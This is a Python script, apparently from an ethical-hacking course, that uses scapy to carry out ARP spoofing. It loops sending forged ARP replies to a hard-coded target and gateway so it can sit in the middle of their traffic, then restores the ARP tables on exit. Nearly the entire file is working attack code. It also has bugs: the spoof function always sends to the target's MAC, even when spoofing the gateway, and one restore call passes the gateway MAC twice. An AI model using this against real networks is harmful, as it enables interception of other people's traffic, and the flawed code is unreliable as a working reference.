#!/usr/bin/env python

import scapy.all as scapy
import time
import sys

def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast/arp_request
    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]

    return answered_list[0][1].hwsrc

def spoof(target_ip, spoof_ip):
#    target_mac = get_mac(target_ip)
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip) #setting op=2 creates an ARP response packet instead of the default ARP request packet created with the default value of op=1
    scapy.send(packet, verbose=False)

def restore(destination_ip, source_ip, destination_mac, source_mac):
#    destination_mac = get_mac(destination_ip)
#    source_mac = get_mac(source_ip)
    packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac) #scapy by default sends the hwsrc as our kali machine MAC add and hence,
    # we did not specify this value in the spoof function
    scapy.send(packet, count=4, verbose=False)


#target_mac = get_mac("10.0.2.9") Use this and remove this line from the spoof function when scanning real networks
#That's a lot of scanning, and thus the get_mac function may sometimes fail to return the target's MAC address in time.
#This error likely doesn't occur in the lecture because Zaid is scanning his virtual NAT network whereas you and I are scanning real networks via our WIFI adapters.
#Instead, a much more efficient way that will solve your problem is to create a static variable in arp_spoof for the target MAC.
# i.e. (hwdst = variable_target_mac - we'll set this variable later). As opposed to the shown implementation which is something like hwdst = get_mac(target_ip).

target_ip = "10.0.2.9"
gateway_ip = "10.0.2.1"
target_mac = get_mac(target_ip)
gateway_mac = get_mac(gateway_ip)


try:
    sent_packets_count = 0
    while True:
        spoof(target_ip, gateway_ip)
        spoof(gateway_ip, target_ip)
        sent_packets_count += 2
    #    print("\r[+] Packets sent: " + str(sent_packets_count), end="") # python3 implementation
        print("\r[+] Packets sent: " + str(sent_packets_count)),  #delete the above line and uncomment these line for a python 2.x soulution and also import sys module.
        sys.stdout.flush()
        time.sleep(2)
except KeyboardInterrupt:
    print("[+] Detected CTRL + C ..... Resetting ARP tables..... Please wait,\n")
    restore(target_ip, gateway_ip, target_mac, gateway_mac)
    restore(gateway_ip, target_ip, gateway_mac, gateway_mac)
